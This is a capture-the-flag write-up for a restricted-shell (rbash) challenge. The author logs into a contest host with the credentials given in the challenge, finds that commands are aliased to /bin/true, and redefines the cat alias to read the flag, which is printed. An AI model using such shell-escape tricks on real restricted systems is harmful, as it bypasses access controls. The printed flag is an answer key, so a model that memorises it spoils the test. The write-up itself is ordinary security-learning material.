# B@SH

Exploitation : 50 Points

## Question

ssh to pwnsauce.cyberbattle.info:8008 using the following credentials:

username: sail

password: sail1234

And get the flag.

## How I got the flag

Restricted shell. Other participants claimed that they managed to ssh with no profile (no idea how). But I managed to get in without it.

My first step was to see if I can find the flag after I ssh in. I found where the flag is with a basic `ls`, revealing `getyourtastyflaghere` directory. Another `ls getyourtastyflaghere` revealed `flag.txt`.

Tried to `cat getyourtastyflaghere/flag.txt`, thinking this was too easy, threw an error:

`-rbash: /bin/true: restricted: cannot specify \`/' in command names`

This caught me by surprise.

I tried everything else with `more, less, touch, vim, vi, nano, grep, find`, etc. All threw the same error message.

Google showed that I was in a Restricted Shell and I need to find a way to escape it. Most of the online guides/slides shows that there's always something in the restricted shell that we can use to escape out of. I tried changing whatever `env` I was in or tried to change my shell from `rbash` to `bash` but I would need a text editor to work with. `tee` didn't work either.

Then I tried `alias`. Found everything I needed. Just needed to change the `cat` alias and that's it.

```
sail@026759e61007:~$ echo "Hello World"
-rbash: /bin/true: restricted: cannot specify `/' in command names
sail@026759e61007:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias awk='/bin/true'
alias cat='/bin/cat'
alias dash='/bin/true'
alias echo='/bin/true'
alias egrep='/bin/true'
alias eval='/bin/true'
alias fgrep='/bin/true'
alias find='/bin/true'
alias grep='/bin/true'
alias head='/bin/true'
alias l='ls -CF'
alias la='ls -A'
alias less='/bin/true'
alias ll='ls -alF'
alias locate='/bin/true'
alias ls='ls --color=auto'
alias more='/bin/true'
alias printf='/bin/true'
alias python='/bin/true'
alias sed='/bin/true'
alias sftp='/bin/true'
alias sh='/bin/true'
alias tail='/bin/true'
alias tee='/bin/true'
alias vi='/bin/true'
alias vim='/bin/true'
alias wget='/bin/true'
alias whereis='/bin/true'
alias which='/bin/true'
sail@026759e61007:~$ alias cat='cat'
sail@026759e61007:~$ cat
^C
sail@026759e61007:~$ cat getyourtastyflaghere/flag.txt 
CBCTF{fun_w17h_b45h}
sail@026759e61007:~$ logout
```
